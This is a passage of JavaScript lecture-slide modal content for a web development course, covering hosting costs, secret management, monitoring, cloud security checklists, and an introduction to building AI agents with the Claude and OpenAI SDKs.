                            <li><strong>Supabase Pro</strong> — $25/month (8GB DB, more storage)</li>
                            <li><strong>Domain</strong> — ~$12/year</li>
                            <li><strong>Total</strong> — ~$45-60/month</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>What You Get</h4>
                        <p>Longer function timeouts, more bandwidth, better support, team features. Still very affordable.</p>
                    </div>
                `
            },
            'cost-scale': {
                title: 'Scale Cost (100K users)',
                body: `
                    <p>At scale, costs grow but are still manageable — and you should have revenue.</p>
                    <div class="modal-section">
                        <h4>Typical Costs</h4>
                        <ul>
                            <li><strong>Vercel Pro</strong> — $20 + ~$100-300 usage</li>
                            <li><strong>Supabase Team</strong> — $599+ (larger DB, more compute)</li>
                            <li><strong>Additional Services</strong> — Monitoring, analytics</li>
                            <li><strong>Total</strong> — $700-1500/month</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>ROI</h4>
                        <p>100K users should generate significant revenue. If not, the problem isn't infrastructure cost.</p>
                    </div>
                `
            },

            // Environment
            'env-never-commit': {
                title: 'Never Commit Secrets',
                body: `
                    <p>Hardcoding secrets in source code is one of the most common security mistakes.</p>
                    <div class="modal-section">
                        <h4>Consequences</h4>
                        <ul>
                            <li>Secrets in git history forever (even after deletion)</li>
                            <li>Anyone with repo access has your keys</li>
                            <li>Bots scan GitHub for exposed keys</li>
                            <li>Credentials can be used within minutes</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>If You Already Did</h4>
                        <p>Rotate the key immediately. Consider using git-filter-repo to remove from history, but assume it's already compromised.</p>
                    </div>
                `
            },
            'env-use-env': {
                title: 'Use Environment Variables',
                body: `
                    <p>Environment variables keep secrets out of code and allow different values per environment.</p>
                    <div class="modal-section">
                        <h4>Setup</h4>
                        <ul>
                            <li><strong>Local</strong> — .env.local (git-ignored)</li>
                            <li><strong>Vercel</strong> — Project settings → Environment Variables</li>
                            <li><strong>Supabase</strong> — Edge Functions → Secrets</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Naming Convention</h4>
                        <p>NEXT_PUBLIC_ prefix for client-side (exposed to browser). No prefix for server-only secrets.</p>
                    </div>
                `
            },

            // Monitoring
            'monitor-errors': {
                title: 'Error Tracking',
                body: `
                    <p>Know when your app breaks before users tell you.</p>
                    <div class="modal-section">
                        <h4>Top Services</h4>
                        <ul>
                            <li><strong>Sentry</strong> — Industry standard, great stack traces</li>
                            <li><strong>LogRocket</strong> — Session replay + errors</li>
                            <li><strong>Bugsnag</strong> — Error monitoring + stability scores</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Setup</h4>
                        <p>Sentry takes 5 minutes to set up. Add the SDK, configure DSN, catch unhandled errors automatically.</p>
                    </div>
                `
            },
            'monitor-analytics': {
                title: 'Analytics',
                body: `
                    <p>Understand how users interact with your application.</p>
                    <div class="modal-section">
                        <h4>Options</h4>
                        <ul>
                            <li><strong>Vercel Analytics</strong> — Built-in, privacy-focused</li>
                            <li><strong>PostHog</strong> — Product analytics, feature flags, session replay</li>
                            <li><strong>Plausible</strong> — Simple, privacy-first, EU-hosted</li>
                            <li><strong>Mixpanel</strong> — Event-based, funnels, retention</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Privacy</h4>
                        <p>Consider GDPR/privacy implications. Plausible and Fathom are cookieless alternatives to Google Analytics.</p>
                    </div>
                `
            },
            'monitor-logs': {
                title: 'Logging',
                body: `
                    <p>Debug production issues with structured logs.</p>
                    <div class="modal-section">
                        <h4>Services</h4>
                        <ul>
                            <li><strong>Vercel Logs</strong> — Built-in, basic but free</li>
                            <li><strong>Axiom</strong> — Modern, great for serverless</li>
                            <li><strong>Logtail</strong> — Simple, good free tier</li>
                            <li><strong>Datadog</strong> — Enterprise, comprehensive</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Best Practice</h4>
                        <p>Structured logging (JSON) makes searching easier. Include request ID for tracing across services.</p>
                    </div>
                `
            },
            'monitor-uptime': {
                title: 'Uptime Monitoring',
                body: `
                    <p>Get alerted when your site goes down — before users notice.</p>
                    <div class="modal-section">
                        <h4>Services</h4>
                        <ul>
                            <li><strong>Better Uptime</strong> — Modern, good free tier</li>
                            <li><strong>Checkly</strong> — API monitoring + browser checks</li>
                            <li><strong>Pingdom</strong> — Classic, reliable</li>
                            <li><strong>UptimeRobot</strong> — Simple, free tier</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Setup</h4>
                        <p>Monitor your health endpoint (/api/health). Alert via Slack, PagerDuty, or SMS for critical paths.</p>
                    </div>
                `
            },

            // Security Checklist
            'cloud-sec-secrets': {
                title: 'Secrets in Env Vars',
                body: `
                    <p>Never commit secrets to version control. Use environment variables and secret managers.</p>
                    <div class="modal-section">
                        <h4>Checklist</h4>
                        <ul>
                            <li>[ ] All API keys in env vars</li>
                            <li>[ ] .env files in .gitignore</li>
                            <li>[ ] Different keys per environment</li>
                            <li>[ ] Keys rotated regularly</li>
                        </ul>
                    </div>
                `
            },
            'cloud-sec-https': {
                title: 'HTTPS Everywhere',
                body: `
                    <p>All traffic should be encrypted. Modern platforms handle this automatically.</p>
                    <div class="modal-section">
                        <h4>Automatic With</h4>
                        <ul>
                            <li>Vercel — Auto SSL for all domains</li>
                            <li>Supabase — All endpoints HTTPS</li>
                            <li>Cloudflare — Free SSL, even for custom domains</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Check</h4>
                        <p>Force HTTPS redirects, set HSTS headers, avoid mixed content warnings.</p>
                    </div>
                `
            },
            'cloud-sec-rls': {
                title: 'Row Level Security',
                body: `
                    <p>Enable RLS on all Supabase tables that contain user data.</p>
                    <div class="modal-section">
                        <h4>Default Secure</h4>
                        <ul>
                            <li>Enable RLS → table is locked by default</li>
                            <li>Add policies to allow specific access</li>
                            <li>Deny-by-default is the right approach</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Test Your Policies</h4>
                        <p>Try to access data as different users. Verify policies work as expected before going live.</p>
                    </div>
                `
            },
            'cloud-sec-auth': {
                title: 'Server-Side Auth Validation',
                body: `
                    <p>Never trust the client — always validate authentication on the server.</p>
                    <div class="modal-section">
                        <h4>Pattern</h4>
                        <ul>
                            <li>Client sends JWT with request</li>
                            <li>Server validates JWT signature</li>
                            <li>Server checks token expiration</li>
                            <li>Server verifies user permissions</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>With Supabase</h4>
                        <p>Use getUser() server-side, not getSession(). getUser() validates with Supabase Auth.</p>
                    </div>
                `
            },
            'cloud-sec-cors': {
                title: 'CORS Configuration',
                body: `
                    <p>Configure CORS to only allow requests from your domains.</p>
                    <div class="modal-section">
                        <h4>Settings</h4>
                        <ul>
                            <li>Access-Control-Allow-Origin: your domains only</li>
                            <li>Avoid * in production</li>
                            <li>Configure allowed methods and headers</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Supabase</h4>
                        <p>CORS is configured in project settings. Restrict to your app domains.</p>
                    </div>
                `
            },
            'cloud-sec-rate': {
                title: 'Rate Limiting',
                body: `
                    <p>Protect your APIs from abuse with rate limiting.</p>
                    <div class="modal-section">
                        <h4>Implementation</h4>
                        <ul>
                            <li><strong>Vercel</strong> — Edge middleware with KV for counters</li>
                            <li><strong>Upstash</strong> — Serverless rate limiting</li>
                            <li><strong>Cloudflare</strong> — Built-in rate limiting rules</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Limits to Set</h4>
                        <p>Login attempts (5/min), API calls (100/min), expensive operations (10/hour). Adjust based on legitimate usage.</p>
                    </div>
                `
            },

            // =====================
            // AI AGENTS LECTURE MODALS
            // =====================

            'agent-definition': {
                title: 'What is an AI Agent?',
                body: `
                    <p>An AI Agent is more than just an LLM — it's a system that can take autonomous action to achieve goals.</p>
                    <div class="modal-section">
                        <h4>Key Components</h4>
                        <ul>
                            <li><strong>LLM Brain</strong> — The reasoning engine (Claude, GPT-4)</li>
                            <li><strong>Tools</strong> — Functions the agent can call</li>
                            <li><strong>Memory</strong> — Conversation history and learned context</li>
                            <li><strong>Orchestration</strong> — Logic that ties it all together</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>The Magic</h4>
                        <p>You describe what you want, the agent figures out how to do it — calling tools, handling errors, and adapting its approach as needed.</p>
                    </div>
                `
            },
            'agent-reasoning': {
                title: 'Agent Reasoning',
                body: `
                    <p>LLMs can break down complex requests into logical steps and make decisions.</p>
                    <div class="modal-section">
                        <h4>Capabilities</h4>
                        <ul>
                            <li><strong>Task Decomposition</strong> — Break "plan a trip" into flights, hotels, activities</li>
                            <li><strong>Decision Making</strong> — Choose between options based on context</li>
                            <li><strong>Error Recovery</strong> — Adapt when something fails</li>
                            <li><strong>Chain of Thought</strong> — Work through problems step by step</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Limits</h4>
                        <p>Agents can hallucinate, make mistakes, or get stuck in loops. Design with guardrails.</p>
                    </div>
                `
            },
            'agent-tools': {
                title: 'Agent Tool Use',
                body: `
                    <p>Tools extend what an LLM can do beyond just generating text.</p>
                    <div class="modal-section">
                        <h4>Common Tool Types</h4>
                        <ul>
                            <li><strong>APIs</strong> — Weather, search, maps, payments</li>
                            <li><strong>Database</strong> — Query, insert, update records</li>
                            <li><strong>Code Execution</strong> — Run calculations, scripts</li>
                            <li><strong>File Operations</strong> — Read, write, transform</li>
                            <li><strong>Web Browsing</strong> — Search, scrape, navigate</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>How It Works</h4>
                        <p>You define tools with JSON schemas. The LLM decides when to use them and with what parameters.</p>
                    </div>
                `
            },
            'agent-memory': {
                title: 'Agent Memory',
                body: `
                    <p>Memory allows agents to maintain context and learn from interactions.</p>
                    <div class="modal-section">
                        <h4>Types of Memory</h4>
                        <ul>
                            <li><strong>Conversation History</strong> — Previous messages in the session</li>
                            <li><strong>Short-term</strong> — Current task context, scratchpad</li>
                            <li><strong>Long-term</strong> — User preferences, past interactions (stored in DB)</li>
                            <li><strong>RAG</strong> — Retrieve relevant documents on demand</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Implementation</h4>
                        <p>LLMs are stateless — your application manages memory by including relevant history in each request.</p>
                    </div>
                `
            },
            'agent-autonomy': {
                title: 'Agent Autonomy',
                body: `
                    <p>Agents can work independently on multi-step tasks without constant human input.</p>
                    <div class="modal-section">
                        <h4>Autonomy Spectrum</h4>
                        <ul>
                            <li><strong>Low</strong> — Single response to each prompt</li>
                            <li><strong>Medium</strong> — Multi-step with human checkpoints</li>
                            <li><strong>High</strong> — Completes complex tasks independently</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Examples</h4>
                        <p>Claude Code can write, test, and debug code autonomously. Marketing agents can generate entire campaigns. But always with appropriate oversight.</p>
                    </div>
                `
            },

            // Agent Types
            'type-chatbot': {
                title: 'Chatbots',
                body: `
                    <p>Traditional chatbots use rule-based logic or simple ML for predefined interactions.</p>
                    <div class="modal-section">
                        <h4>Characteristics</h4>
                        <ul>
                            <li>Decision trees and if/else logic</li>
                            <li>Keyword matching</li>
                            <li>Predefined response templates</li>
                            <li>Limited ability to handle edge cases</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Use Cases</h4>
                        <p>FAQ bots, appointment booking, simple customer service flows where predictability is key.</p>
                    </div>
                `
            },
            'type-assistant': {
                title: 'AI Assistants',
                body: `
                    <p>LLM-powered assistants can understand natural language and maintain conversations.</p>
                    <div class="modal-section">
                        <h4>Characteristics</h4>
                        <ul>
                            <li>Natural language understanding</li>
                            <li>Contextual responses</li>
                            <li>General knowledge</li>
                            <li>Reactive to user prompts</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Examples</h4>
                        <p>ChatGPT, Claude.ai, Gemini — great for Q&A, writing, analysis, but they wait for you to ask.</p>
                    </div>
                `
            },
            'type-agent': {
                title: 'AI Agents',
                body: `
                    <p>Agents combine LLM reasoning with tool use to accomplish goals autonomously.</p>
                    <div class="modal-section">
                        <h4>Characteristics</h4>
                        <ul>
                            <li>Goal-oriented behavior</li>
                            <li>Autonomous tool execution</li>
                            <li>Multi-step planning</li>
                            <li>Error handling and recovery</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Examples</h4>
                        <p>Claude Code (writes and executes code), Devin (software engineer), marketing agents, customer support bots with real actions.</p>
                    </div>
                `
            },

            // History
            'history-eliza': {
                title: 'ELIZA (1966)',
                body: `
                    <p>The first chatbot, created by Joseph Weizenbaum at MIT.</p>
                    <div class="modal-section">
                        <h4>How It Worked</h4>
                        <ul>
                            <li>Pattern matching on keywords</li>
                            <li>Scripted responses with variable substitution</li>
                            <li>Famous "DOCTOR" script mimicked a therapist</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>The Surprise</h4>
                        <p>People formed emotional attachments to ELIZA despite knowing it was a program — the first glimpse of AI's psychological impact.</p>
                    </div>
                `
            },
            'history-siri': {
                title: 'Siri & Voice Assistants (2011)',
                body: `
                    <p>Apple's Siri brought AI assistants to the mainstream consumer market.</p>
                    <div class="modal-section">
                        <h4>Key Innovations</h4>
                        <ul>
                            <li>Voice recognition at scale</li>
                            <li>Integration with device features</li>
                            <li>Cloud-based processing</li>
                            <li>Natural language understanding</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Legacy</h4>
                        <p>Alexa (2014), Google Assistant (2016) followed. But these were still rule-based at their core.</p>
                    </div>
                `
            },
            'history-gpt3': {
                title: 'GPT-3 (2020)',
                body: `
                    <p>OpenAI's 175 billion parameter model demonstrated emergent capabilities.</p>
                    <div class="modal-section">
                        <h4>Breakthrough</h4>
                        <ul>
                            <li>Few-shot learning — teach with examples</li>
                            <li>Broad general knowledge</li>
                            <li>Code generation</li>
                            <li>Creative writing</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>API Access</h4>
                        <p>For the first time, developers could build products on top of powerful LLMs via simple API calls.</p>
                    </div>
                `
            },
            'history-chatgpt': {
                title: 'ChatGPT (2022)',
                body: `
                    <p>ChatGPT brought AI to the mainstream with an intuitive chat interface.</p>
                    <div class="modal-section">
                        <h4>Impact</h4>
                        <ul>
                            <li>Fastest growing app in history</li>
                            <li>100M users in 2 months</li>
                            <li>Sparked global AI conversation</li>
                            <li>Every company wanted "AI features"</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>The Shift</h4>
                        <p>RLHF (Reinforcement Learning from Human Feedback) made AI feel helpful and safe to talk to.</p>
                    </div>
                `
            },
            'history-tools': {
                title: 'Tool Use Era (2023)',
                body: `
                    <p>LLMs gained the ability to call external functions and use plugins.</p>
                    <div class="modal-section">
                        <h4>Key Developments</h4>
                        <ul>
                            <li><strong>Function Calling</strong> — Structured tool invocation</li>
                            <li><strong>ChatGPT Plugins</strong> — Web browsing, code interpreter</li>
                            <li><strong>Claude Tool Use</strong> — First-class support in API</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Paradigm Shift</h4>
                        <p>LLMs went from "answer questions" to "take actions" — the foundation for true agents.</p>
                    </div>
                `
            },
            'history-agents': {
                title: 'Agent Era (2024+)',
                body: `
                    <p>The emergence of production-ready agent frameworks and applications.</p>
                    <div class="modal-section">
                        <h4>Key Players</h4>
                        <ul>
                            <li><strong>Claude Code</strong> — Autonomous coding agent</li>
                            <li><strong>Codex CLI</strong> — OpenAI's coding assistant</li>
                            <li><strong>Devin</strong> — AI software engineer</li>
                            <li><strong>Agent SDKs</strong> — Anthropic, OpenAI frameworks</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>The Future</h4>
                        <p>Agents are moving from demos to production. Companies are shipping real agent products.</p>
                    </div>
                `
            },

            // Agent Stack
            'stack-application': {
                title: 'Your Application',
                body: `
                    <p>The business logic and user interface that the agent enhances.</p>
                    <div class="modal-section">
                        <h4>Examples</h4>
                        <ul>
                            <li>E-commerce site with AI shopping assistant</li>
                            <li>SaaS with intelligent onboarding</li>
                            <li>Mobile app with conversational UI</li>
                            <li>Internal tool with automated workflows</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Integration Points</h4>
                        <p>Chat interfaces, search bars, background automation, notification triggers.</p>
                    </div>
                `
            },
            'stack-sdk': {
                title: 'Agent SDK',
                body: `
                    <p>Client libraries that make it easy to call LLM APIs and handle responses.</p>
                    <div class="modal-section">
                        <h4>Popular SDKs</h4>
                        <ul>
                            <li><strong>@anthropic-ai/sdk</strong> — Official Claude SDK</li>
                            <li><strong>openai</strong> — Official OpenAI SDK</li>
                            <li><strong>ai (Vercel)</strong> — Unified AI SDK with streaming</li>
                            <li><strong>langchain</strong> — Multi-provider orchestration</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>What They Handle</h4>
                        <p>Authentication, request formatting, streaming, retries, error handling.</p>
                    </div>
                `
            },
            'stack-tools': {
                title: 'Tools',
                body: `
                    <p>Functions that extend what the LLM can do.</p>
                    <div class="modal-section">
                        <h4>Tool Categories</h4>
                        <ul>
                            <li><strong>Data Access</strong> — Database queries, file reads</li>
                            <li><strong>External APIs</strong> — Weather, maps, payments</li>
                            <li><strong>Computation</strong> — Math, code execution</li>
                            <li><strong>Actions</strong> — Send email, create ticket, deploy</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Design Principle</h4>
                        <p>Tools should be atomic and well-documented. The LLM needs to understand when and how to use each one.</p>
                    </div>
                `
            },
            'stack-llm': {
                title: 'LLM',
                body: `
                    <p>The reasoning engine that understands intent and generates responses.</p>
                    <div class="modal-section">
                        <h4>Model Selection</h4>
                        <ul>
                            <li><strong>Claude Sonnet</strong> — Best balance of capability and speed</li>
                            <li><strong>Claude Opus</strong> — Most capable for complex tasks</li>
                            <li><strong>GPT-4o</strong> — Fast multimodal</li>
                            <li><strong>Claude Haiku / GPT-4o-mini</strong> — Fast and cheap</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Choosing</h4>
                        <p>Match model capability to task complexity. Don't use Opus for simple Q&A.</p>
                    </div>
                `
            },
            'stack-memory': {
                title: 'Memory',
                body: `
                    <p>Context management to maintain coherent conversations.</p>
                    <div class="modal-section">
                        <h4>Implementation</h4>
                        <ul>
                            <li><strong>Message Array</strong> — Full conversation history</li>
                            <li><strong>Summarization</strong> — Compress old context</li>
                            <li><strong>Vector Store</strong> — RAG for long-term memory</li>
                            <li><strong>Database</strong> — User preferences, past interactions</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Context Window</h4>
                        <p>Claude has 200K tokens — enough for very long conversations before you need summarization.</p>
                    </div>
                `
            },

            // SDK Comparison
            'sdk-install': {
                title: 'SDK Installation',
                body: `
                    <p>Both SDKs are available via npm and fully typed with TypeScript.</p>
                    <div class="modal-section">
                        <h4>Claude SDK</h4>
                        <pre><code>npm install @anthropic-ai/sdk</code></pre>
                    </div>
                    <div class="modal-section">
                        <h4>OpenAI SDK</h4>
                        <pre><code>npm install openai</code></pre>
                    </div>
                    <div class="modal-section">
                        <h4>Vercel AI SDK</h4>
                        <pre><code>npm install ai @ai-sdk/anthropic @ai-sdk/openai</code></pre>
                        <p>Unified interface for both providers with React hooks for streaming.</p>
                    </div>
                `
            },
            'sdk-streaming': {
                title: 'Streaming Support',
                body: `
                    <p>Both SDKs support streaming responses for real-time output.</p>
                    <div class="modal-section">
                        <h4>Why Stream?</h4>
                        <ul>
                            <li>Better perceived performance</li>
                            <li>User sees response as it generates</li>
                            <li>Can cancel mid-response</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Implementation</h4>
                        <p>Both use async iterators or callback-based streaming. Vercel AI SDK adds React hooks for easy frontend integration.</p>
                    </div>
                `
            },
            'sdk-tools': {
                title: 'Tool Use Support',
                body: `
                    <p>Both SDKs support function/tool calling with JSON schemas.</p>
                    <div class="modal-section">
                        <h4>Claude</h4>
                        <ul>
                            <li>Native tool use in API</li>
                            <li>Multiple tool calls per turn</li>
                            <li>Tool results as message content</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>OpenAI</h4>
                        <ul>
                            <li>Function calling API</li>
                            <li>Parallel function calls</li>
                            <li>Similar flow and patterns</li>
                        </ul>
                    </div>
                `
            },
            'sdk-vision': {
                title: 'Vision / Multimodal',
                body: `
                    <p>Both support image understanding in addition to text.</p>
                    <div class="modal-section">
                        <h4>Use Cases</h4>
                        <ul>
                            <li>Image analysis and description</li>
                            <li>Screenshot understanding</li>
                            <li>Document/receipt processing</li>
                            <li>Visual Q&A</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>How To</h4>
                        <p>Pass images as base64 or URL in the message content array alongside text.</p>
                    </div>
                `
            },
            'sdk-context': {
                title: 'Context Window',
                body: `
                    <p>The amount of text the model can process in a single request.</p>
                    <div class="modal-section">
                        <h4>Comparison</h4>
                        <ul>
                            <li><strong>Claude</strong> — 200K tokens (~150K words)</li>
                            <li><strong>GPT-4 Turbo</strong> — 128K tokens</li>
                            <li><strong>GPT-4o</strong> — 128K tokens</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Impact</h4>
                        <p>Larger context = longer conversations, more documents for RAG, bigger codebases for analysis.</p>
                    </div>
                `
            },

            // Setup
            'setup-install': {
                title: 'Installing the SDK',
                body: `
                    <p>Add the Anthropic SDK to your project.</p>
                    <div class="modal-section">
                        <h4>npm</h4>
                        <pre><code>npm install @anthropic-ai/sdk</code></pre>
                    </div>
                    <div class="modal-section">
                        <h4>TypeScript</h4>
                        <p>Types are included. No separate @types package needed.</p>
                    </div>
                    <div class="modal-section">
                        <h4>Requirements</h4>
                        <p>Node.js 18+ recommended. Works in browsers with appropriate CORS setup.</p>
                    </div>
                `
            },
            'setup-env': {
                title: 'API Key Setup',
                body: `
                    <p>Get your API key from console.anthropic.com.</p>
                    <div class="modal-section">
                        <h4>Environment Variable</h4>
                        <pre><code>ANTHROPIC_API_KEY=sk-ant-api03-...</code></pre>
                    </div>
                    <div class="modal-section">
                        <h4>Security</h4>
                        <ul>
                            <li>Never commit API keys to git</li>
                            <li>Use .env.local (gitignored)</li>
                            <li>For production: use secrets manager</li>
                        </ul>
                    </div>
                `
            },
            'setup-init': {
                title: 'Initializing the Client',
                body: `
                    <p>Create a client instance to make API calls.</p>
                    <div class="modal-section">
                        <h4>Auto-Configuration</h4>
                        <pre><code>const client = new Anthropic();
// Reads ANTHROPIC_API_KEY automatically</code></pre>
                    </div>
                    <div class="modal-section">
                        <h4>Explicit Configuration</h4>
                        <pre><code>const client = new Anthropic({
  apiKey: process.env.ANTHROPIC_API_KEY,
  maxRetries: 3,
  timeout: 60000
});</code></pre>
                    </div>
                `
            },

            // Code Examples
            'code-basic-chat': {
                title: 'Basic Chat Code',
                body: `
                    <p>The simplest possible API call to Claude.</p>
                    <div class="modal-section">
                        <h4>Key Parameters</h4>
                        <ul>
                            <li><strong>model</strong> — Which Claude model to use</li>
                            <li><strong>max_tokens</strong> — Maximum response length</li>
                            <li><strong>messages</strong> — Conversation history</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Response Structure</h4>
                        <p>Response contains a content array with text blocks. Multiple blocks are possible with tool use.</p>
                    </div>
                `
            },
            'code-system-prompt': {
                title: 'System Prompts',
                body: `
                    <p>System prompts define the agent's personality and capabilities.</p>
                    <div class="modal-section">
                        <h4>Best Practices</h4>
                        <ul>
                            <li>Be specific about the persona</li>
                            <li>Define capabilities and limitations</li>
                            <li>Include relevant context (date, user info)</li>
                            <li>Set tone and communication style</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Keep It Focused</h4>
                        <p>Don't overload the system prompt. Important instructions can go in user messages too.</p>
                    </div>
                `
            },
            'code-continuity': {
                title: 'Conversation Continuity',
                body: `
                    <p>Managing state across multiple turns is crucial for coherent conversations.</p>
                    <div class="modal-section">
                        <h4>How It Works</h4>
                        <ul>
                            <li>Store messages in an array</li>
                            <li>Send entire history with each request</li>
                            <li>LLM sees full context and responds accordingly</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Persistence</h4>
                        <p>For cross-session memory, store history in a database keyed by user/session ID.</p>
                    </div>
                `
            },
            'code-multi-turn': {
                title: 'Multi-Turn Example',
                body: `
                    <p>Demonstrating how context carries through a conversation.</p>
                    <div class="modal-section">
                        <h4>Key Observations</h4>
                        <ul>
                            <li>Each turn builds on previous context</li>
                            <li>Pronouns resolve correctly ("that one")</li>
                            <li>The agent remembers earlier constraints</li>
                            <li>Natural conversation flow emerges</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Under the Hood</h4>
                        <p>The LLM processes the entire conversation each time — it doesn't have persistent memory between API calls.</p>
                    </div>
                `
            },

            // Tool Examples
            'tool-search': {
                title: 'Search Products Tool',
                body: `
                    <p>Query your database to find relevant products.</p>
                    <div class="modal-section">
                        <h4>When the LLM Uses It</h4>
                        <ul>
                            <li>"Find laptops under $1000"</li>
                            <li>"Show me red dresses"</li>
                            <li>"What phones do you have?"</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Implementation</h4>
                        <p>The tool calls your actual database, ORM, or search index. Return structured results the LLM can describe to users.</p>
                    </div>
                `
            },
            'tool-weather': {
                title: 'Weather API Tool',
                body: `
                    <p>Call external APIs to get real-time data.</p>
                    <div class="modal-section">
                        <h4>Example</h4>
                        <pre><code>async function getWeather(location: string) {
  const res = await fetch(
    \`https://api.weather.com/v1/current?q=\${location}\`
  );
  return res.json();
}</code></pre>
                    </div>
                    <div class="modal-section">
                        <h4>Why Tools for APIs</h4>
                        <p>LLMs can't make HTTP requests directly. Tools bridge the gap between reasoning and action.</p>
                    </div>
                `
            },
            'tool-calculate': {
                title: 'Calculation Tool',
                body: `
                    <p>LLMs can make math errors. Tools provide precise computation.</p>
                    <div class="modal-section">
                        <h4>Example</h4>
                        <pre><code>function calculate(expression: string) {
  // Use a safe math parser
  return mathjs.evaluate(expression);
}</code></pre>
                    </div>
                    <div class="modal-section">
                        <h4>Use Cases</h4>
                        <ul>
                            <li>Price calculations with tax</li>
                            <li>Currency conversions</li>
                            <li>Statistics and analytics</li>
                        </ul>
                    </div>
                `
            },
            'tool-email': {
                title: 'Send Email Tool',
                body: `
                    <p>Tools that take real-world actions need careful consideration.</p>
                    <div class="modal-section">
                        <h4>Safety Considerations</h4>
                        <ul>
                            <li>Require confirmation for destructive actions</li>
                            <li>Rate limit to prevent abuse</li>
                            <li>Log all actions for audit</li>
                            <li>Consider approval workflows</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Pattern</h4>
                        <p>High-stakes tools (email, payments, deletes) should often return a preview for human approval before executing.</p>
                    </div>
                `
            },

            // Tool Code
            'code-tool-definition': {
                title: 'Tool Definition Schema',
                body: `
                    <p>Tools are defined with JSON Schema for parameters.</p>
                    <div class="modal-section">
                        <h4>Schema Components</h4>
                        <ul>
                            <li><strong>name</strong> — Unique identifier for the tool</li>
                            <li><strong>description</strong> — Helps LLM decide when to use it</li>
                            <li><strong>input_schema</strong> — JSON Schema for parameters</li>
                            <li><strong>required</strong> — Which parameters are mandatory</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Pro Tip</h4>
                        <p>Good descriptions are crucial. The LLM reads them to decide which tool to use.</p>
                    </div>
                `
            },
            'code-tool-handling': {
                title: 'Handling Tool Calls',
                body: `
                    <p>The flow when an LLM wants to use a tool.</p>
                    <div class="modal-section">
                        <h4>Steps</h4>
                        <ol>
                            <li>LLM returns response with tool_use block</li>
                            <li>Your code executes the tool</li>
                            <li>Send tool result back to LLM</li>
                            <li>LLM generates final response</li>
                        </ol>
                    </div>
                    <div class="modal-section">
                        <h4>Note</h4>
                        <p>The LLM may call multiple tools, or call tools in a loop until the task is complete.</p>
                    </div>
                `
            },
            'code-tool-impl': {
                title: 'Tool Implementation',
                body: `
                    <p>Connect tool definitions to your actual business logic.</p>
                    <div class="modal-section">
                        <h4>Pattern</h4>
                        <ul>
                            <li>Switch statement or map for routing</li>
                            <li>Type-safe parameter extraction</li>
                            <li>Error handling and fallbacks</li>
                            <li>Structured return values</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Return Values</h4>
                        <p>Return JSON that the LLM can interpret. Include relevant details for the response.</p>
                    </div>
                `
            },
            'code-agent-loop': {
                title: 'Agent Loop Pattern',
                body: `
                    <p>The core pattern for autonomous agents that can use multiple tools.</p>
                    <div class="modal-section">
                        <h4>How It Works</h4>
                        <ol>
                            <li>Send user message to LLM</li>
                            <li>If LLM calls tools, execute them</li>
                            <li>Send results back, let LLM continue</li>
                            <li>Repeat until LLM says it's done</li>
                        </ol>
                    </div>
                    <div class="modal-section">
                        <h4>Safety</h4>
                        <p>Add a maximum iteration limit to prevent infinite loops. Log each iteration for debugging.</p>
                    </div>
                `
            },
            'code-streaming': {
                title: 'Streaming Responses',
                body: `
                    <p>Stream responses for better UX in chat interfaces.</p>
                    <div class="modal-section">
                        <h4>Benefits</h4>
                        <ul>
                            <li>Faster time to first token</li>
                            <li>Progressive response display</li>
                            <li>Better perceived performance</li>
                            <li>Can cancel mid-generation</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Vercel AI SDK</h4>
                        <p>For React/Next.js, the Vercel AI SDK provides useChat and useCompletion hooks with built-in streaming.</p>
                    </div>
                `
            },

            // System Prompt Tips
            'tip-persona': {
                title: 'Defining Persona',
                body: `
                    <p>Tell the agent who it is and how it should behave.</p>
                    <div class="modal-section">
                        <h4>Elements</h4>
                        <ul>
                            <li>Role (assistant, expert, character)</li>
                            <li>Tone (formal, casual, enthusiastic)</li>
                            <li>Knowledge domain</li>
                            <li>Communication style</li>
                        </ul>
                    </div>
